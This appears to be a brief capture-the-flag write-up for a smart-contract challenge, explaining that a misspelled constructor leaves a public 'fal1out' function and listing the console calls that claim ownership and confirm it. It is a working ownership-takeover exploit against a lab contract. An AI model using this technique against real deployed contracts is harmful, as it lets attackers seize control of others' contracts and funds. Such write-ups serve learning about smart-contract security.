In this contract the contructor is simply misspelled due to developer error, therfore I can call it myself and gain ownership as ```msg.sender```

Call the function.
```contract.fal1out()```

Check ownership has transfered to me.
```contract.owner()```

Check my address to confirm.
```player```
